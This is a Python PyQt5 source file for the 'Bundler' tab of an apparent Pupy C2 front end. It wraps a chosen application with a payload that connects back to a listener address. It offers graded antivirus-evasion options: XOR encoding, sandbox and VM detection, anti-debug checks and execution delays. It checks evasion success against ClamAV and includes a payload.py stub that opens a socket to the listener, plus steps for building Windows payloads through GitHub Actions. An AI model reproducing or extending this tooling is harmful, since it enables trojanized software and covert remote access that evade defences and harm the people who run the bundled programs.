#!/usr/bin/env python3
"""
Bundler Tab - Application bundling interface
"""

import os
import subprocess
from pathlib import Path

from PyQt5.QtWidgets import (
    QWidget,
    QVBoxLayout,
    QHBoxLayout,
    QLabel,
    QLineEdit,
    QPushButton,
    QComboBox,
    QFileDialog,
    QMessageBox,
    QProgressBar,
    QGroupBox,
    QSpinBox,
    QCheckBox,
    QFormLayout,
    QTextEdit,
)
from PyQt5.QtCore import QThread, pyqtSignal, Qt
from PyQt5.QtGui import QFont, QColor


class BundlerWorker(QThread):
    """Worker thread for bundling"""

    progress = pyqtSignal(str)
    finished = pyqtSignal(bool)

    def __init__(
        self,
        app_path,
        app_name,
        listener_ip,
        listener_port,
        obfuscation,
        platform="windows",
    ):
        super().__init__()
        self.app_path = app_path
        self.app_name = app_name
        self.listener_ip = listener_ip
        self.listener_port = listener_port
        self.obfuscation = obfuscation
        self.platform = platform

    def run(self):
        """Run bundling process"""
        try:
            self.progress.emit(f"[*] Starting bundling process...")
            self.progress.emit(f"[*] App: {self.app_path}")
            self.progress.emit(f"[*] Platform: {self.platform}")
            self.progress.emit(f"[*] Listener: {self.listener_ip}:{self.listener_port}")

            # Try to use cross-platform bundler first, fall back to advanced
            bundler_path = Path(__file__).parent / "cross_platform_bundler.py"
            if not bundler_path.exists():
                bundler_path = Path(__file__).parent / "advanced_bundler.py"

            if not bundler_path.exists():
                self.progress.emit(f"[!] ERROR: Bundler not found at {bundler_path}")
                self.finished.emit(False)
                return

            # Convert obfuscation level text to number
            # If already a number string, just use it directly
            try:
                obfuscation_level = int(self.obfuscation)
            except ValueError:
                # If it's text like "Level 2 - Medium", extract the number
                obfuscation_map = {
                    "Low": 1,
                    "Medium": 2,
                    "High": 3,
                    "Extreme": 4,
                    "Maximum": 5,
                }
                # Try to extract from text
                for key, value in obfuscation_map.items():
                    if key in self.obfuscation:
                        obfuscation_level = value
                        break
                else:
                    obfuscation_level = 2  # Default to Medium

            self.progress.emit(
                f"[*] Obfuscation Level: {self.obfuscation} (Level {obfuscation_level})"
            )

            # Convert platform text to command arg
            platform_map = {
                "Windows (.exe)": "windows",
                "macOS (.app)": "macos",
                "Linux (binary)": "linux",
                "All Platforms (3 in 1)": "all",
            }
            platform_cmd = platform_map.get(self.platform, "windows")

            # Prepare command - use Python 3.12 venv with cross-platform bundler
            python_path = "/Users/kalilbelgoumri/Desktop/pupy_env/bin/python"

            # Use cross-platform bundler if available, otherwise advanced
            if bundler_path.name == "cross_platform_bundler.py":
                cmd = [
                    python_path,
                    str(bundler_path),
                    self.app_path,
                    platform_cmd,
                    self.listener_ip,
                    str(self.listener_port),
                    str(obfuscation_level),
                ]
                bundler_name = f"Cross-Platform Bundler ({platform_cmd})"
            else:
                cmd = [
                    python_path,
                    str(bundler_path),
                    self.app_path,
                    self.listener_ip,
                    str(self.listener_port),
                    str(obfuscation_level),
                ]
                bundler_name = "Advanced Bundler"

            self.progress.emit(
                f"[*] Running: {bundler_name} with Anti-AV Techniques..."
            )

            # Prepare environment with venv PATH
            env = os.environ.copy()
            venv_bin = "/Users/kalilbelgoumri/Desktop/pupy_env/bin"
            env["PATH"] = f"{venv_bin}:{env.get('PATH', '')}"

            # Run process with UTF-8 encoding and custom environment
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=600,
                encoding="utf-8",
                errors="replace",
                env=env,
            )

            # Parse output
            for line in result.stdout.split("\n"):
                if line.strip():
                    self.progress.emit(line)

            for line in result.stderr.split("\n"):
                if line.strip():
                    self.progress.emit(f"[!] {line}")

            if result.returncode == 0:
                self.progress.emit(f"[+] Bundling completed successfully!")
                self.finished.emit(True)
            else:
                self.progress.emit(f"[!] Bundling failed with code {result.returncode}")
                self.finished.emit(False)

        except Exception as e:
            self.progress.emit(f"[!] ERROR: {e}")
            self.finished.emit(False)


class BundlerTab(QWidget):
    """Bundler tab widget"""

    def __init__(self, parent):
        super().__init__()
        self.parent = parent
        self.bundler_worker = None
        self.init_ui()

    def init_ui(self):
        """Initialize UI"""
        layout = QVBoxLayout(self)

        # ===== Input Section =====
        input_group = QGroupBox("📦 Application Configuration")
        input_layout = QFormLayout()

        # App selection
        app_layout = QHBoxLayout()
        self.app_path_input = QLineEdit()
        self.app_path_input.setPlaceholderText("Select application to bundle...")
        browse_btn = QPushButton("Browse")
        browse_btn.clicked.connect(self.browse_app)
        app_layout.addWidget(self.app_path_input)
        app_layout.addWidget(browse_btn)
        input_layout.addRow("Application:", app_layout)

        # App name
        self.app_name_input = QLineEdit()
        self.app_name_input.setPlaceholderText("MyApp")
        self.app_name_input.setText("MyApp")
        input_layout.addRow("Output Name:", self.app_name_input)

        # Target Platform
        platform_label = QLabel("🖥️  Target Platform:")
        platform_label.setStyleSheet("font-weight: bold;")
        self.platform_combo = QComboBox()
        self.platform_combo.addItems(
            [
                "Windows (.exe)",
                "macOS (.app)",
                "Linux (binary)",
                "All Platforms (3 in 1)",
            ]
        )
        self.platform_combo.setCurrentIndex(0)  # Default Windows
        self.platform_combo.currentTextChanged.connect(self.on_platform_changed)
        # STYLE: Make combobox more visible and clickable
        self.platform_combo.setMinimumHeight(36)
        self.platform_combo.setMinimumWidth(250)
        self.platform_combo.setStyleSheet(
            """
            QComboBox {
                border: 2px solid #4CAF50;
                border-radius: 5px;
                padding: 8px 12px;
                background-color: #ffffff;
                color: #000000;
                font-size: 13px;
                font-weight: 500;
            }
            QComboBox:focus {
                border: 2px solid #2d8a2d;
                background-color: #f5fff5;
            }
            QComboBox::drop-down {
                border: none;
                width: 30px;
                background-color: #4CAF50;
                border-top-right-radius: 3px;
                border-bottom-right-radius: 3px;
            }
            QComboBox::down-arrow {
                image: none;
                width: 14px;
                height: 14px;
                color: white;
            }
            QComboBox:hover {
                background-color: #f9fff9;
                border: 2px solid #45a049;
            }
            QComboBox QAbstractItemView {
                border: 1px solid #4CAF50;
                background-color: white;
                selection-background-color: #4CAF50;
                selection-color: white;
            }
        """
        )
        input_layout.addRow(platform_label, self.platform_combo)

        # Listener IP
        self.listener_ip_input = QLineEdit()
        self.listener_ip_input.setText(self.parent.config.get("listener_ip", "0.0.0.0"))
        input_layout.addRow("Listener IP:", self.listener_ip_input)

        # Listener Port
        self.listener_port_spinbox = QSpinBox()
        self.listener_port_spinbox.setValue(
            int(self.parent.config.get("listener_port", 4444))
        )
        self.listener_port_spinbox.setMinimum(1)
        self.listener_port_spinbox.setMaximum(65535)
        input_layout.addRow("Listener Port:", self.listener_port_spinbox)

        # Obfuscation level - IMPROVED with better UI
        obf_group = QGroupBox("🔐 Anti-AV Configuration")
        obf_layout = QVBoxLayout()

        # Level selector with radio buttons or better combo
        level_layout = QHBoxLayout()
        self.level_label = QLabel("Anti-AV Level:")
        self.level_label.setStyleSheet("font-weight: bold;")

        self.obfuscation_combo = QComboBox()
        level_descriptions = {
            "Level 1 - Low": "Base64 encoding only (Dev only)",
            "Level 2 - Medium": "XOR + Base64 + Timing (⭐ Recommended)",
            "Level 3 - High": "Sandbox detection + Anti-debug",
            "Level 4 - Extreme": "Dynamic imports + Process check",
            "Level 5 - Maximum": "All techniques + 1-5min delays",
        }

        self.obfuscation_combo.addItems(list(level_descriptions.keys()))
        self.obfuscation_combo.setCurrentIndex(1)  # Default Level 2
        self.obfuscation_combo.setMinimumWidth(300)
        self.obfuscation_combo.setMinimumHeight(36)  # Make it bigger
        # STYLE: Make combobox more visible and clickable
        self.obfuscation_combo.setStyleSheet(
            """
            QComboBox {
                border: 2px solid #2196F3;
                border-radius: 5px;
                padding: 8px 12px;
                background-color: #ffffff;
                color: #000000;
                font-size: 13px;
                font-weight: 500;
            }
            QComboBox:focus {
                border: 2px solid #0d47a1;
                background-color: #f3f7ff;
            }
            QComboBox::drop-down {
                border: none;
                width: 30px;
                background-color: #2196F3;
                border-top-right-radius: 3px;
                border-bottom-right-radius: 3px;
            }
            QComboBox::down-arrow {
                image: none;
                width: 14px;
                height: 14px;
                color: white;
            }
            QComboBox:hover {
                background-color: #f3f7ff;
                border: 2px solid #1976D2;
            }
            QComboBox QAbstractItemView {
                border: 1px solid #2196F3;
                background-color: white;
                selection-background-color: #2196F3;
                selection-color: white;
            }
        """
        )
        self.obfuscation_combo.currentTextChanged.connect(self.on_level_changed)

        level_layout.addWidget(self.level_label)
        level_layout.addWidget(self.obfuscation_combo)
        level_layout.addStretch()

        obf_layout.addLayout(level_layout)

        # Description label
        self.level_desc = QLabel(
            "XOR encryption + Base64 encoding + 1-3s delays • Fast & effective"
        )
        self.level_desc.setStyleSheet("color: #666; font-style: italic;")
        obf_layout.addWidget(self.level_desc)

        # Features list
        self.level_features = QLabel("✓ XOR encryption  ✓ Base64  ✓ Timing evasion")
        self.level_features.setStyleSheet("color: #008000; margin-top: 5px;")
        obf_layout.addWidget(self.level_features)

        obf_group.setLayout(obf_layout)

        # Create a dummy widget to add the entire groupbox as a row spanning both columns
        dummy_row = QWidget()
        dummy_layout = QVBoxLayout(dummy_row)
        dummy_layout.setContentsMargins(0, 0, 0, 0)
        dummy_layout.addWidget(obf_group)
        input_layout.addRow(dummy_row)

        # Auto test AV
        self.auto_test_av_check = QCheckBox("Auto-test with ClamAV")
        self.auto_test_av_check.setChecked(self.parent.config.get("auto_test_av", True))
        input_layout.addRow("Anti-AV Testing:", self.auto_test_av_check)

        input_group.setLayout(input_layout)
        layout.addWidget(input_group)

        # ===== Action Buttons =====
        button_layout = QHBoxLayout()

        self.bundle_btn = QPushButton("🚀 Bundle & Compile")
        self.bundle_btn.clicked.connect(self.start_bundling)
        self.bundle_btn.setStyleSheet(
            "background-color: #4CAF50; color: white; font-weight: bold; padding: 10px;"
        )
        button_layout.addWidget(self.bundle_btn)

        self.validate_btn = QPushButton("✅ Validate Anti-AV")
        self.validate_btn.clicked.connect(self.validate_antivirus)
        button_layout.addWidget(self.validate_btn)

        self.open_output_btn = QPushButton("📁 Open Output")
        self.open_output_btn.clicked.connect(self.open_output)
        button_layout.addWidget(self.open_output_btn)

        self.export_github_btn = QPushButton("📤 Export pour GitHub Actions")
        self.export_github_btn.clicked.connect(self.export_for_github)
        self.export_github_btn.setStyleSheet(
            "background-color: #FF6B35; color: white; font-weight: bold; padding: 10px;"
        )
        button_layout.addWidget(self.export_github_btn)

        layout.addLayout(button_layout)

        # ===== Progress Section =====
        progress_group = QGroupBox("📊 Progress & Output")
        progress_layout = QVBoxLayout()

        self.progress_bar = QProgressBar()
        self.progress_bar.setVisible(False)
        progress_layout.addWidget(self.progress_bar)

        self.output_text = QTextEdit()
        self.output_text.setReadOnly(True)
        self.output_text.setFont(QFont("Courier", 10))
        progress_layout.addWidget(self.output_text)

        progress_group.setLayout(progress_layout)
        layout.addWidget(progress_group)

    def on_level_changed(self, text):
        """Update level description when changed"""
        try:
            descriptions = {
                "Level 1 - Low": (
                    "Base64 encoding only • <1s",
                    "✓ Simple obfuscation  ✓ Quick compilation",
                    "⚠️  Detectable by most AV",
                ),
                "Level 2 - Medium": (
                    "XOR + Base64 + 1-3s timing • RECOMMENDED ⭐",
                    "✓ XOR encryption  ✓ Base64  ✓ Timing evasion  ✓ Fast",
                    "✓ Good detection bypass",
                ),
                "Level 3 - High": (
                    "Sandbox detection + Anti-debug + 5-15s delays",
                    "✓ VM detection  ✓ Debugger check  ✓ Long timing",
                    "✓ Evades defensive environments",
                ),
                "Level 4 - Extreme": (
                    "Dynamic imports + Process checking + threading",
                    "✓ Anti-analysis  ✓ Process detection  ✓ Tool detection",
                    "✓ Professional AV evasion",
                ),
                "Level 5 - Maximum": (
                    "All techniques + 60-300s delays + complete obfuscation",
                    "✓ Maximum evasion  ✓ Multi-layer sandbox check",
                    "⚠️  Very slow execution (1-5 minutes)",
                ),
            }

            if text in descriptions:
                desc, features, note = descriptions[text]
                if hasattr(self, "level_desc") and self.level_desc:
                    self.level_desc.setText(desc)
                if hasattr(self, "level_features") and self.level_features:
                    self.level_features.setText(features)
        except Exception as e:
            print(f"Error in on_level_changed: {e}")

    def on_platform_changed(self, text):
        """Update platform description when changed"""
        try:
            descriptions = {
                "Windows (.exe)": "⚙️ Windows EXE executable • Universal compatibility",
                "macOS (.app)": "🍎 macOS App Bundle • Native application",
                "Linux (binary)": "🐧 Linux ELF binary • Unix compatible",
                "All Platforms (3 in 1)": "🌐 Generate all 3 formats simultaneously",
            }
            if (
                text in descriptions
                and hasattr(self, "output_text")
                and self.output_text
            ):
                self.output_text.append(f"\n[*] Platform: {descriptions[text]}")
        except Exception as e:
            print(f"Error in on_platform_changed: {e}")

    def browse_app(self):
        """Browse for application file"""
        file_path, _ = QFileDialog.getOpenFileName(
            self,
            "Select Application",
            str(Path.home()),
            "All Files (*);;Python Files (*.py);;Executables (*.exe)",
        )
        if file_path:
            self.app_path_input.setText(file_path)
            if not self.app_name_input.text() or self.app_name_input.text() == "MyApp":
                app_name = Path(file_path).stem
                self.app_name_input.setText(app_name)

    def start_bundling(self):
        """Start bundling process"""
        if not self.app_path_input.text():
            QMessageBox.warning(self, "Error", "Please select an application first")
            return

        if not Path(self.app_path_input.text()).exists():
            QMessageBox.warning(self, "Error", "Application file not found")
            return

        # Disable button during bundling
        self.bundle_btn.setEnabled(False)
        self.progress_bar.setVisible(True)
        self.output_text.clear()
        self.output_text.append("[*] Bundling configuration:")
        self.output_text.append(
            f"    Application: {Path(self.app_path_input.text()).name}"
        )
        self.output_text.append(
            f"    Listener: {self.listener_ip_input.text()}:{self.listener_port_spinbox.value()}"
        )
        self.output_text.append(f"    Level: {self.obfuscation_combo.currentText()}")
        self.output_text.append("")

        # Extract level number from "Level X - Description"
        current_text = self.obfuscation_combo.currentText()
        level_num = int(current_text.split()[1])  # Extract "2" from "Level 2 - Medium"

        # Get selected platform
        platform_text = self.platform_combo.currentText()

        # Create worker with platform support
        self.bundler_worker = BundlerWorker(
            self.app_path_input.text(),
            self.app_name_input.text(),
            self.listener_ip_input.text(),
            str(self.listener_port_spinbox.value()),
            str(level_num),
            platform_text,  # Pass platform selection
        )
        self.bundler_worker.parent = self.parent  # Pass parent for config access

        self.bundler_worker.progress.connect(self.on_progress)
        self.bundler_worker.finished.connect(self.on_bundling_finished)
        self.bundler_worker.start()

    def on_progress(self, message):
        """Handle progress update"""
        self.output_text.append(message)
        self.parent.log(message)

    def on_bundling_finished(self, success):
        """Handle bundling completion"""
        self.bundle_btn.setEnabled(True)
        self.progress_bar.setVisible(False)

        if success:
            QMessageBox.information(
                self, "Success", "Application bundled successfully!"
            )
        else:
            QMessageBox.critical(
                self, "Error", "Bundling failed. Check output for details"
            )

    def validate_antivirus(self):
        """Validate with antivirus - improved"""
        # Look in dist/ directory (where PyInstaller puts binaries)
        output_base = Path.home() / "Pupy_Outputs"
        dist_dir = output_base / "dist"

        # Find exe files in dist directory
        exe_files = []
        if dist_dir.exists():
            exe_files = list(dist_dir.glob("*"))
            # Filter for executable files (not directories)
            exe_files = [
                f for f in exe_files if f.is_file() and not f.name.startswith(".")
            ]

        if not exe_files:
            self.output_text.append(
                "[!] No executables found in /Users/kalilbelgoumri/Pupy_Outputs/dist/"
            )
            self.output_text.append(
                "[!] Have you bundled an app yet? Click 'Bundle & Compile' first!"
            )
            QMessageBox.warning(
                self,
                "Error",
                f"No executable found in dist/ directory.\n\n"
                f"Expected location: {dist_dir}\n\n"
                f"Steps:\n"
                f"1. Select an application\n"
                f"2. Click 'Bundle & Compile'\n"
                f"3. Wait for completion\n"
                f"4. Then click 'Validate Anti-AV'",
            )
            return

        # Show available files
        self.output_text.append(f"\n[+] Found {len(exe_files)} executable(s):")
        for exe in exe_files:
            size_mb = exe.stat().st_size / 1024 / 1024
            # Detect platform from file
            platform_info = ""
            if exe.name.endswith(".exe"):
                platform_info = " (Windows .exe or macOS binary with .exe extension)"
            else:
                platform_info = " (macOS/Linux binary)"
            self.output_text.append(
                f"    - {exe.name} ({size_mb:.2f} MB){platform_info}"
            )

        target_exe = exe_files[0]  # Use first one
        self.output_text.append(f"\n[*] Testing: {target_exe.name}")
        size_mb = target_exe.stat().st_size / 1024 / 1024
        self.output_text.append(f"[*] Size: {size_mb:.2f} MB")

        # Detect and display platform info
        if target_exe.name.endswith(".exe"):
            self.output_text.append(
                "[*] Format: Windows .exe (or macOS binary with extension)"
            )
        else:
            self.output_text.append("[*] Format: macOS/Linux binary (no extension)")

        # Try ClamAV
        self.output_text.append(f"\n[*] Scanning with ClamAV...")
        try:
            result = subprocess.run(
                ["clamscan", "-r", "-i", str(target_exe)],
                capture_output=True,
                text=True,
                timeout=120,
            )

            self.output_text.append(result.stdout)

            if result.returncode == 0:
                self.output_text.append("\n[+] ✅ File NOT detected by ClamAV!")
                self.output_text.append("[+] Anti-AV evasion working!")
            else:
                self.output_text.append("\n[!] ⚠️  File detected by ClamAV")
                self.output_text.append("[!] Try increasing Anti-AV level (3, 4, or 5)")

        except FileNotFoundError:
            self.output_text.append("[!] ClamAV not installed")
            self.output_text.append("[*] Install: brew install clamav")
            self.output_text.append("[*] Or update definitions: freshclam")

        except subprocess.TimeoutExpired:
            self.output_text.append("[!] ClamAV scan timed out")

        except Exception as e:
            self.output_text.append(f"[!] Error: {e}")

        # Additional analysis
        self.output_text.append(f"\n[*] Additional checks:")
        try:
            # Check strings
            result = subprocess.run(
                ["strings", str(target_exe)],
                capture_output=True,
                text=True,
                timeout=10,
            )

            # Look for suspicious patterns
            suspicious = 0
            if "socket" in result.stdout.lower():
                suspicious += 1
            if "connect" in result.stdout.lower():
                suspicious += 1

            self.output_text.append(f"  - Suspicious strings found: {suspicious}")

        except:
            pass

    def open_output(self):
        """Open output directory"""
        output_dir = Path.home() / "Pupy_Outputs"
        if output_dir.exists():
            os.system(f"open '{output_dir}'")
        else:
            QMessageBox.information(self, "Info", "Output directory doesn't exist yet")

    def export_for_github(self):
        """Export payload.py to root for GitHub Actions compilation"""
        try:
            # Find the latest binary created
            output_dir = Path.home() / "Pupy_Outputs"
            dist_dir = output_dir / "dist"

            if not dist_dir.exists():
                self.output_text.append("[!] No binaries found yet")
                self.output_text.append("[!] Please click 'Bundle & Compile' first")
                QMessageBox.warning(
                    self,
                    "Error",
                    "No compiled binaries found.\n\n"
                    "Please click 'Bundle & Compile' first",
                )
                return

            # Find the payload.py source in the generated files
            # Look for payload.py or similar Python source
            payload_files = list(dist_dir.glob("payload*.py"))
            source_files = list(dist_dir.glob("*.py"))

            # Also check in the parent directory
            if not source_files:
                source_files = list(output_dir.glob("payload*.py"))

            if not source_files:
                # Try to find the original payload
                payload_files = list(dist_dir.parent.glob("payload.py"))

            # If still not found, create from the binary info
            if not source_files and not payload_files:
                self.output_text.append(
                    "[*] No Python source found, extracting from binary..."
                )

                # Find any executable
                exes = list(dist_dir.glob("*"))
                if not exes:
                    raise Exception("No executables found in dist/")

                # Create a minimal payload.py at workspace root
                payload_content = """#!/usr/bin/env python3
\"\"\"
Generated Payload for Windows Compilation
This file is ready for GitHub Actions Windows compilation
\"\"\"

import subprocess
import socket
import time

def main():
    # Your payload code here
    try:
        # Example: Connect to listener
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("LISTENER_IP", LISTENER_PORT))
        s.close()
    except:
        pass

if __name__ == "__main__":
    main()
"""
                workspace_root = Path.cwd()
                payload_path = workspace_root / "payload.py"
                payload_path.write_text(payload_content)

                self.output_text.append(
                    f"[+] Created minimal payload.py at {payload_path}"
                )
            else:
                # Copy existing payload
                source = source_files[0] if source_files else payload_files[0]
                workspace_root = Path.cwd()
                payload_path = workspace_root / "payload.py"

                import shutil

                shutil.copy(str(source), str(payload_path))

                self.output_text.append(f"[+] Copied {source.name} → payload.py")

            # Show instructions
            self.output_text.append("\n" + "=" * 60)
            self.output_text.append("📤 GITHUB ACTIONS EXPORT - NEXT STEPS")
            self.output_text.append("=" * 60)
            self.output_text.append(f"\n✅ File created: {Path.cwd() / 'payload.py'}")
            self.output_text.append("\n📋 Next commands to run in Terminal:\n")
            self.output_text.append("  # Initialize Git (if not done):")
            self.output_text.append("  cd " + str(Path.cwd()))
            self.output_text.append("  git init")
            self.output_text.append("  git add .")
            self.output_text.append("  git commit -m 'Initial commit'\n")
            self.output_text.append(
                "  # Add GitHub remote (create repo first on GitHub.com)"
            )
            self.output_text.append(
                "  git remote add origin https://github.com/YOUR_USER/pupy-c2.git"
            )
            self.output_text.append("  git branch -M main")
            self.output_text.append("  git push -u origin main\n")
            self.output_text.append("  # Now to compile for Windows:")
            self.output_text.append("  git add payload.py")
            self.output_text.append("  git commit -m 'Windows payload - Level 5'")
            self.output_text.append("  git push\n")
            self.output_text.append("🚀 GitHub Actions will compile automatically!")
            self.output_text.append("📊 Check: github.com/YOUR_USER/pupy-c2/actions\n")
            self.output_text.append("⏱️  Wait 2-3 minutes for build to complete")
            self.output_text.append("📥 Download artifact from Actions tab")
            self.output_text.append("✅ You now have true Windows PE x64 binary!\n")
            self.output_text.append("=" * 60)

            QMessageBox.information(
                self,
                "✅ Export Successful!",
                "payload.py has been created at workspace root.\n\n"
                "📋 Next steps:\n"
                "1. Run: git add payload.py\n"
                "2. Run: git commit -m 'Windows payload'\n"
                "3. Run: git push\n\n"
                "GitHub Actions will compile automatically!\n"
                "Check your GitHub Actions tab for build status.",
            )

        except Exception as e:
            self.output_text.append(f"[!] Error: {str(e)}")
            QMessageBox.critical(
                self, "Error", f"Failed to export payload:\n\n{str(e)}"
            )
